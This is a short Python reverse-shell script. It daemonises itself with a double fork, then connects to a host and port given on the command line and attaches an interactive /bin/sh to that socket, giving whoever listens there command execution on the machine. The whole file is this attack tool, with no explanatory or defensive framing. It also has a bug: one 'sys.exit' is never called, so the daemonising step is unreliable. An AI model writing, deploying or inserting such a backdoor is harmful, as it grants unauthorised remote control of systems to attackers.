#!/usr/bin/env python

import argparse
import os
import socket
import subprocess
import sys

def get_args():
    p = argparse.ArgumentParser()
    p.add_argument('host', type=str)
    p.add_argument('port', type=int)
    return p.parse_args()

def double_fork(pwd='/'):
    try:
        if os.fork() > 0:
            sys.exit
    except OSError as e:
        sys.exit(1)
    try:
        os.chdir(pwd)
        os.setsid()
        os.umask(0)
    except OSError as e:
        if os.getpid() != os.getpgid(0):
            sys.exit(1)
    try:
        if os.fork() > 0:
            sys.exit(0)
    except OSError as e:
        sys.exit(1)

def run_rshell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    subprocess.Popen('/bin/sh -i',
                     shell=True, 
                     stdout=s.fileno(), 
                     stderr=s.fileno(), 
                     stdin=s.fileno())

if __name__ == '__main__':
    args = get_args()
    double_fork()
    run_rshell(args.host, args.port)
